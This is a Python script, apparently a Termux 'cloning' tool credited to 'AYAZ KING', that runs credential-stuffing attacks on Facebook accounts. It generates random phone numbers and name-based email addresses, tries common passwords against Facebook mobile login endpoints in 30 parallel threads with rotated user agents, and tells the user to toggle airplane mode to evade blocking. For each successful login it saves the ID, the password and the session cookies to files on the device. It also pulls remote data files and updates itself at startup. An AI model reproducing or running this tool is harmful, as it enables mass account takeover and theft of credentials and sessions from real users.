#SC OWNER_______________AYAZ_KING

import os,sys,time,re,uuid,base64,zlib,subprocess
from concurrent.futures import  ThreadPoolExecutor as tpe
try:
    import pycurl
    from io import BytesIO
except:
    os.system('pip install pycurl')
    import pycurl
    from io import BytesIO
try:import pycurl
except:os.system('pkg uninstall python;pkg install python -y;pip install pycurl')
try:import pycurl
except:print('\n Pycurl Module Error!\n Contact With Owner! ');exit()
import random
os.system('xdg-openhttps:///')
print('[wait] TOOL LOADING')
import os
import sys
import time
import requests
import uuid
os.system('git pull')
os.system('pkg install curl')
import os,sys,time,json,random,re,string,platform,base64,uuid
os.system("git pull")
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup
import requests as ress
from datetime import date
from datetime import datetime
from time import sleep
from time import sleep as waktu
fbks=('com.facebook.adsmanager','com.facebook.lite','com.facebook.orca','com.facebook.katana')
g1=('A');g2=('K');g3=('I');g4=('N');g5=('G');g6=('1');g7=('1');g8=('0');pr=('-P');pr1=('R');pr2=('O')
ghb=g1+g2+g3+g4+g5+g6+g7+g8
gghb=g1+g2+g3+g4+g5+pr+pr1+pr2
cx=('.g');cxx=('fig');xl=('/')
  
import os,base64
os.system("xdg-open https://chat.whatsapp.com/")
u1=('u');u2=('n');u3=('i');u4=('n');u5=('s');u6=('t');u7=('a');u8=('l');u9=('l')
ustl=u1+u2+u3+u4+u5+u6+u7+u8+u9
r1=('r');r2=('e');r3=('q');r4=('u');r5=('e');r6=('s');r7=('t');r8=('s')
rqts=r1+r2+r3+r4+r5+r6+r7+r8
y1=('-');y2=('y');y3=(' > ')
ys=y1+y2+y3

try:
	import os,requests,json,time,re,random,sys,uuid,string,subprocess
	from string import *
	import bs4
	#import dz
	from concurrent.futures import ThreadPoolExecutor as tred
	from bs4 import BeautifulSoup as sop
	from bs4 import BeautifulSoup
except ModuleNotFoundError: 
	print('\n Installing missing modules ...')
	os.system('pip install requests bs4 futures==2 > /dev/null')
	os.system('python HUNT3R.py')
android_models=[]
try:
	xx = requests.get('https://raw.githubusercontent.com/AKING110/Data/main/sm.txt').text.splitlines()
	for line in xx:
		android_models.append(line)
except:pass
myid=uuid.uuid4().hex[:5].upper()

usr=[]
try:
	xd=requests.get('https://raw.githubusercontent.com/ahmad77412/DATA-FILE/main/UAGNT').text.splitlines()
	for us in xd:
		usr.append(us)
except: pass
pyt=('python3.11')
pkgz=('packages')
ap1=('a')
ap2=('pi')
ap3=('.p')
api=ap1+ap2+ap3
md1=('mo')
md2=('de')
md3=('ls')
md4=('.p')
mudl=md1+md2+md3+md4
#------------------[ USER-AGENT-DEFAULT ]-------------------#
ugen2=[]
ugen=[]
cokbrut=[]
ses=requests.Session()
princp=[]

for xd in range(10000):
    a='Mozilla/5.0 (Symbian/3; Series60/'
    b=random.randrange(1, 9)
    c=random.randrange(1, 9)
    d='Nokia'
    e=random.randrange(100, 9999)
    f='/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/'
    g=random.randrange(1, 9)
    h=random.randrange(1, 4)
    i=random.randrange(1, 4)
    j=random.randrange(1, 4)
    k='Mobile Safari/535.1'
    uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
    ugen2.append(uaku)


    aa='Mozilla/5.0 (Linux; U; Android'
    b=random.choice(['2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18'])
    c=' en-us; GT-'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h=random.randrange(10,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Mobile Safari/537.36'
    uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
    ugen.append(uaku2)
def uaku():
	try:
		ua=open('bbnew.txt','r').read().splitlines()
		for ub in ua : 
			ugen.append(ub)
	except:
		a=requests.get('https://github.com/EC-1709/a/blob/main/bbnew.txt').text
		ua=open('.bbnew.txt','w')
		aa=re.findall('line">(.*?)<',str(a))
		for un in aa:
			ua.write(un+'\n')
		ua=open('.bbnew.txt','r').read().splitlines()
	 

#__________________[ LOGO ]__________________#
logo =f"""

\x1b[1;91m    
 $$$$$$\ $$\     $$\  $$$$$$\  $$$$$$$$\       
$$  __$$\\$$\   $$  |$$  __$$\ \____$$  |      
$$ /  $$ |\$$\ $$  / $$ /  $$ |    $$  /       
$$$$$$$$ | \$$$$  /  $$$$$$$$ |   $$  /        
$$  __$$ |  \$$  /   $$  __$$ |  $$  /         
$$ |  $$ |   $$ |    $$ |  $$ | $$  /          
$$ |  $$ |   $$ |    $$ |  $$ |$$$$$$$$\       
\__|  \__|   \__|    \__|  \__|\________|      
                                               
                                               
                                               
                                               
                                               
                                               
                                               
                                               
                                               
                                               
                                               
                                               
                                               
                                               
                                               

\x1b[1;91m
\x1b[1;32m
\x1b[132m
/x1b[132m   
         
\033[1;37m──────────────────────────────────────────────────
[\x1b[1;95m+\x1b[1;97m] AUTHOR : AYAZ KING 
[\x1b[1;95m+\x1b[1;97m] FACEBOOK :100083987168787
[\x1b[1;95m+\x1b[1;97m] VERSION : {2.5}
\033[1;37m──────────────────────────────────────────────────"""
def linex():
	print('\033[1;32m----------------------------------------------')
def clear():
	os.system('clear')
	print(logo)
A = '\x1b[1;97m' 
B = '\x1b[1;96m' 
C = '\x1b[1;91m' 
D = '\x1b[1;92m'
M = '\033[1;31m'
H = '\033[1;32m'
N = '\x1b[1;91m'	
E = '\x1b[1;93m' 
F = '\x1b[1;94m'
G = '\x1b[1;95m'
P = '\033[1;91m'
def cek_apk(session,coki):
	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
	sop = BeautifulSoup(w,"html.parser")
	x = sop.find("form",method="post")
	game = [i.text for i in x.find_all("h3")]
	if len(game)==0:
		print(f'\r%s [%sâ€¢%s] %sActive Apks & Web Not Found %s		'%(N,H,N,H,N))
	else:
		print(f'\r{A} [â€¢]%s Active Apks & Web ðŸ‘‡ '%(H))
		for i in range(len(game)):
			print(f"\r%s [%s] %s %s "%(D,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),D))
	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
	sop = BeautifulSoup(w,"html.parser")
	x = sop.find("form",method="post")
	game = [i.text for i in x.find_all("h3")]
	if len(game)==0:
		print(f'\r%s [%sâ€¢%s] %sExpired Apks & Web Not Found %s		'%(N,M,N,M,N))
	else:
		print(f'\r{A} [â€¢]%s Expired Apks & Web ðŸ‘‡ '%(M))
		for i in range(len(game)):
			print(f"\r%s [%s] %s %s "%(C,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),A))
loop=0
oks=[]
cps=[]
pcp=[]
id=[]
tokenku=[]

def menu(): 
	os.system('clear')
	print(logo)
	print(f'\033[1;31m[\033[1;32m1\033[1;31m]\033[1;37m RANDOM CLONING')
	print(f'\033[1;31m[\033[1;32m0\033[1;31m]\033[1;37m EXIT TOOLS')
	linex()
	xd=input(' Choose an option: ')
	if xd in ['04','04']:
		clear()
				
		
	
	elif xd in ['1','01']:
		clear()
		print(f'\033[1;31m[\033[1;32m1\033[1;31m]\033[1;35m PAKISTAN CLONING')
		print(f'\033[1;31m[\033[1;32m2\033[1;31m]\033[1;35m BD INDIA  CLONING')
		print(f'\033[1;31m[\033[1;32m3\033[1;31m]\033[1;35m GMAIL CLONING')
		print(f'\033[1;31m[\033[1;32m0\033[1;31m]\033[1;35m BACK TO MAIN MENU')
		linex()
		x=input(' Choose: ')
		if x in ['1','01']:
			pak()
		elif x in ['2','02']:
			bd()
		elif x in ['3','03']:
			gmail()
		else:
			menu()
			
	elif xd in ['5','05']:
	   gmail()
	elif xd in ['6','06']:
	    
	
		exit(' KHUDA HAFIZ ')
	else:
		exit(' Option not found in menu...')
		
def pak():
		user=[]
		clear()
		print('\033[1;31m Code example: 0306,0315,0335,0345')
		code = input('\033[1;32m put code: ')
		try:
			limit = int(input('\033[1;32m example: 2000, 3000, 5000, 10000\n\033[1;91m put limit: '))
		except ValueError:
			limit = 5000
		linex()
		print(' [1] Method 1\n [2] Method 2 Best ')
		linex()
		mthd = input(' Choose: ')
		linex()
		print(' [1] Clone with 7+11 digit pass (v-fast)\n [2] Clone with auto pass (fast)\n [3] Clone with auto pass v2 (slow-best) ')
		linex()
		pcs = input(' [?] Select: ')
		for nmbr in range(limit):
			nmp = ''.join(random.choice(string.digits) for _ in range(7))
			user.append(nmp)
		with tred(max_workers=30) as AXI:	
			clear()
			tl = str(len(user))
			print(f'\033[1;31m[\033[1;32m✓\033[1;31m]\033[1;37m TOTAL UID : {str(len(user))}')
			print(f'\033[1;31m[\033[1;32m✓\033[1;31m]\033[1;37m SIM CODE  : {code}')
			print(f'\033[1;31m[\033[1;32m✓\033[1;31m]\033[1;37m TURN {G}[{G}ON{G}/{G}OFF]  \033[1;32mAIRPLANE MODE EVERY 1 MIN')
			linex()
			for psx in user:
				ids = code+psx
				if pcs in ['1','01']:
					passlist = [psx,ids]
				elif pcs in ['2','02']:
					passlist = [psx,ids,'khankhan','firstlast123','first01','khan1234','full number']
				else:
					passlist = [psx,ids,'khankhan','khan1122','first786','khan1234','firstlast123','pak123','khan123','khan12345']
				if mthd in ['1','01']:
					AXI.submit(rcrack1,ids,passlist)
				else:
					AXI.submit(rcrack,ids,passlist)
		print('\033[1;91m')
		linex()
		print(' The process has completed')
		print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
		linex()
		input(' Press enter to back ')
		os.system('python ayaz69.py')
def bd():
		user=[]
		clear()
		print('\033[1;32m BD CODES : 016,017,018,019')
		print('\033[1;32m INDIA CODES  : \033[1;33m91778, \033[1;33m91930 ,\033[1;33m91902 ,\033[1;33m91712  ...\033[0;97m')
        
		code = input('\033[1;32m put code: ')
		try:
			limit = int(input('\033[1;32m example: 2000, 3000, 5000, 10000\n\033[1;91m put limit: '))
		except ValueError:
			limit = 5000
		linex()
		print(' [1] Method 1\n [2] Method 2 ')
		linex()
		mthd = input(' Choose: ')
		for nmbr in range(limit):
			nmp = ''.join(random.choice(string.digits) for _ in range(8))
			user.append(nmp)
		with tred(max_workers=30) as AXI:	
			clear()
			tl = str(len(user))
			print(' Total idz : \033[1;32m'+tl+f' ')
			print(f'\033[1;32m Choice code ..:\033[1;32m '+code)
			print(f'\033[1;32m \x1b[38;5;208mUse flight mode for best result\033[1;97m')
			linex()
			for psx in user:
				ids = code+psx
				passlist = [psx,ids,'57573200','firstlast123','first01','57575751','full number']
				if mthd in ['1','01']:
					AXI.submit(rcrack1,ids,passlist)
				else:
					AXI.submit(rcrack,ids,passlist)
		print('\033[1;91m')
		linex()
		print(' The process has completed')
		print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
		linex()
		input(' Press enter to back ')
		os.system('python HUNT3R.py')
def gmail():
		os.system('rm -rf .re.txt')
		clear()
		print('\033[1;32m example: muhammad, zeeshan, ramzan, faizan , zoya\033[1;97m')
		linex()
		first = input(' Put first name: ')
		linex()
		print('\033[1;32m example: khan, ahmad, ali \033[1;97m')
		linex()
		last = input(' Put last name: ')
		linex()
		print(' Example: @gmail.com , @yahoo.com etc...')
		linex()
		domain = input(' domain: ')
		linex()
		try:
			limit=int(input(' Put limit: '))
		except ValueError:
			limit = 5000
		linex()
		print(' [1] Only name password \n [2] name + digit password \n [3] Capital name password\n [4] Auto all password')
		linex()
		pxc = input(' Choose : ')
		linex()
		print(' [1] Method 1\n [2] Method 2 ')
		linex()
		mthd = input(' Choose: ')
		linex()
		print(' Getting gmails...')
		lists = ['3','4']
		for xd in range(limit):
			lchoice = random.choice(lists)
			if '3' in lchoice:
				mail = ''.join(random.choice(string.digits) for _ in range(3))
				open('.re.txt','a').write(first.lower()+last.lower()+mail+domain+'|'+first+' '+last+'\n')
			else:
				mail = ''.join(random.choice(string.digits) for _ in range(4))
				open('.re.txt','a').write(first.lower()+last.lower()+mail+domain+'|'+first+' '+last+'\n')
			fo = open('.re.txt', 'r').read().splitlines()
		with tred(max_workers=30) as AXI:
			total = str(len(fo))
			clear()
			print('\033[1;31m[\033[1;32m✓\033[1;31m] TOTAL MAILS : \033[1;32m'+total+f' ')
			print(f'\033[1;31m[\033[1;32m✓\033[1;31m]\033[1;37m TODAY DATE AND TIME {G}:{G} {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}')
			print(f'\033[1;31m[\033[1;32m✓\033[1;31m]\033[1;37m TURN {G}[{G}ON{G}/{G}OFF]  \033[1;32mAIRPLANE MODE EVERY 1 MIN')
			linex()
			for user in fo:
				ids,names = user.split('|')
				first_name = names.rsplit(' ')[0]
				try:
					last_name = names.rsplit(' ')[1]
				except IndexError:
					last_name = 'Khan'
				fs = first_name.lower()
				ls = last_name.lower()
				if pxc in ['1','01']:
					passlist = [fs+ls,fs+' '+ls,fs]
				elif pxc in ['2','02']:
					passlist = [fs+ls,fs+' '+ls,fs+'123',fs+'12345',fs+'1122']
				elif pxc in ['3','03']:
					passlist = [first_name+last_name,first_name+' '+last_name,first_name+'123']
				else:
					passlist = [fs+ls,fs+' '+ls,first_name+last_name,first_name+' '+last_name,fs+'123',fs+'786',fs+'12345',fs+'1122']
				if mthd in ['1','01']:
					AXI.submit(rcrack1,ids,passlist)
				else:
					AXI.submit(rcrack,ids,passlist)
		print('\033[1;91m')
		linex()
		print(' The process has completed')
		print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
		linex()
		input(' Press enter to back ')
		os.system('python ayaz679.py')

def ffb(ids,names,passlist):
	global loop,oks,cps
	sys.stdout.write('\r\r\033[1;37m [Running..] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
	session = requests.Session()
	try:
		first = names.split(' ')[0]
		try:
			last = names.split(' ')[1]
		except:
			last = 'Khan'
		ps = first.lower()
		ps2 = last.lower()
		for fikr in passlist:
			pas = fikr.replace('First',first).replace('Last',last).replace('first',ps).replace('last',ps2)
			ua=random.choice(ugen)
			head = {'Host': 'p.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="100", "Google Chrome";v="100"', 'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform':'"Android"', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent':'Mozilla/5.0 (Linux; Android 12; CPH2341 Build/SKQ1.211209.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/99.0.4844.88 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/402.0.0.21.84;]', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-US,en;q=0.9'}
			getlog = session.get(f'https://p.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr')
			idpass ={"lsd":re.search('name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":ids,"next":"https://p.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}
			complete = session.post('https://p.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head)
			AXI=session.cookies.get_dict().keys()
			if "c_user" in AXI:
				coki=session.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
				print('\r\r\033[1;32m [AYAZ-OK] '+ids+' | '+pas+'\033[1;97m')
				print('\033[1;32m [\033[1;37mBISCUIT\033[1;32m]\033[1;37m '+coki)
				open('/sdcard/AYAZ-OK.txt', 'a').write(ids+'|'+pas+' | '+coki+'\n')
				oks.append(ids)
				break
			elif 'checkpoint' in AXI:
				if 'y' in pcp:
					print('\r\r\x1b[38;5;208m [AYAZ-CP] '+ids+' | '+pas+'\033[1;97m')
					open('/sdcard/HUNT3R-CP.txt', 'a').write(ids+'|'+pas+'\n')
					cps.append(ids)
					break
				else:
					break
			else:
				continue
	except requests.exceptions.ConnectionError:
		time.sleep(20)
	loop+=1

pass
def rcrack(ids,passlist):
	global loop
	global oks
	try:
		for pas in passlist:
			sys.stdout.write('\r\r\033[1;37m [AYAZ] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
			session = requests.Session()
			pro = random.choice(ugen)
			free_fb = session.get('https://free.facebook.com').text
			log_data = {
				"lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
			"jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
			"m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
			"li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
			"try_number":"0",
			"unrecognized_tries":"0",
			"email":ids,
			"pass":pas,
			"login":"Log In"}
			header_freefb = {'authority': 'm.facebook.com',
			'method': 'POST',
			'scheme': 'https',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-US,en;q=0.9',
    'cache-control': 'max-age=0',
    'referer': 'https://mbasic.facebook.com/settings/?entry_point=mbasic_footer_link&eav=AfYFUMphCkQev6iY93lQExnc-AqkzTBsT_G7nsj1xVXi-NXkL4UP2payy0V5irX2KWk&paipv=0&ref_component=mbasic_footer&ref_page=XMenuController',
    'sec-ch-prefers-color-scheme': 'light',
    'sec-ch-ua': '"(Not(A:Brand";v="99", "Chromium";v="123", "Google Chrome";v="123"',
    'sec-ch-ua-full-version-list': '"(Not(A:Brand";v="99.0.0.0", "Chromium";v="123.0.6335.198", "Google Chrome";v="123.0.6335.198"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-model': '"22120RN86G"',
    'sec-ch-ua-platform': '"Android"',
    'sec-ch-ua-platform-version': '""',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'viewport-width': '980',
    'user-agent':'Mozilla/5.0 (Linux; Android 12; CPH2341 Build/SKQ1.211209.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/99.0.4844.88 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/402.0.0.21.84;]',}
			lo = session.post('https://x.facebook.com/login/device-based/regular/login/?refsrc=deprecated&amp;lwv=100&amp;refid=8',data=log_data,headers=header_freefb).text
			log_cookies=session.cookies.get_dict().keys()
			if 'c_user' in log_cookies:
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				uid = coki[7:22]
				if uid in oks:pass
				else:
					if 'checkpoint' in str(lo):
						print('\r\r\033[1;34m [AYAZ-TL] '+ids+' | '+pas+'\033[1;97m')
						print('\033[1;32m [\033[1;37mBISCUIT\033[1;32m]\033[1;37m '+coki)
					else:
						print('\r\r\033[1;32m [AYAZ-CP] '+ids+' | '+pas+'\033[1;97m')
						print('\033[1;32m [\033[1;37mBISCUIT\033[1;32m]\033[1;37m '+coki)
						cek_apk(session,coki)
						open('/sdcard/AYAZ-OK.txt', 'a').write(ids+'|'+pas+'\n')
						oks.append(uid)
						break
			elif 'checkpoint' in log_cookies:
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				uid = coki[24:39]
				if uid in cps:pass
				else:
					print('\r\r\x1b[38;5;208m [AYAZ-CP] '+ids+' | '+pas+'\033[1;97m')
					open('/sdcard/AYAZ-CP.txt', 'a').write(ids+'|'+pas+'\n')
					cps.append(ids)
					break
			else:
				continue
		loop+=1
	except requests.exceptions.ConnectionError:
		time.sleep(10)
	except:
		pass

menu()
